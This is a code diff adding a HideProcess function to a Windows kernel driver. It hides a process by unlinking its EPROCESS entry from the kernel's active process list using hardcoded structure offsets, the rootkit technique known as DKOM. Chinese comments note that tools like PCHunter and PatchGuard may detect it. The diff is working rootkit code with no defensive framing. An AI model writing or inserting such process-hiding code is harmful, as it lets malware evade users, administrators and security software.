@@ -3,6 +3,35 @@
 #include "GlobalVariables.h"
 #include "Driverdef.h"
 
+//EPROCESS 结构下的偏移
+#define PIDOffset (UINT32)0x180    
+#define ProcessLinksOffset (UINT32)0x188
+//貌似技术古老，会被pchunter 发现
+//断链--被PG检测---需要更新偏移
+NTSTATUS HideProcess(ULONG ulPID) {
+	PEPROCESS pCurProcess = NULL;
+	ULONG CurPID = 0;
+
+	pCurProcess = PsGetCurrentProcess();//system process
+	PLIST_ENTRY pActiveProcessLinks = (PLIST_ENTRY)((DWORD_PTR)pCurProcess + ProcessLinksOffset);
+	PLIST_ENTRY pNextLinks = pActiveProcessLinks->Flink;
+	while (pNextLinks->Flink != pActiveProcessLinks->Flink)
+	{
+		//DbgPrint("Founding...\n");
+		pCurProcess = (DWORD_PTR)pNextLinks - ProcessLinksOffset;
+		CurPID = *(ULONG*)((DWORD_PTR)pCurProcess + PIDOffset);
+		if (CurPID == ulPID) {
+			//*(ULONG*)((DWORD_PTR)pCurProcess + PIDOffset) += 123;
+			pNextLinks->Flink->Blink = pNextLinks->Blink;
+			pNextLinks->Blink->Flink = pNextLinks->Flink;
+			KdPrint(("Found and Delete Chain\n"));
+			return STATUS_SUCCESS;
+		}
+		pNextLinks = pNextLinks->Flink;
+	}
+	KdPrint(("Pid Not Found\n"));
+	return STATUS_NOT_FOUND;
+}
 
 // 根据进程ID返回进程EPROCESS结构体,失败返回NULL
 PEPROCESS LookupProcess(HANDLE Pid)
